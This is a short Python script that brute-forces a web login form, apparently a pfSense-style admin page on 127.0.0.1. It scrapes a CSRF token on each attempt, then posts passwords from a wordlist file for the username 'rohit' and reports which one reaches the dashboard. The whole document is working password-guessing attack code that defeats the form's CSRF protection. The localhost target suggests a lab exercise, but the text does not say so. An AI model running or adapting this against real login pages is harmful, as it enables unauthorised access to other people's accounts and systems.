import requests
import re
sess = requests.Session()
csrf = 'csrfMagicToken = "(.*?)"'
lines = open('pass.txt')
for line in lines:
    req = sess.post("http://127.0.0.1/index.php")
    csrf_val = re.findall(csrf, req.text)[0]
    data = {"__csrf_magic": csrf_val, "usernamefld": "rohit", "passwordfld": line[:-1], "login": "Login"}
    req = sess.post("http://127.0.0.1/index.php", data=data)
    if "Dashboard" in req.text:
        print("Sucessful %s:%s" % ("rohit", line[:-1]))
    else:
        print("Failed %s:%s" % ("rohit", line[:-1]))
        sess.cookies.clear()
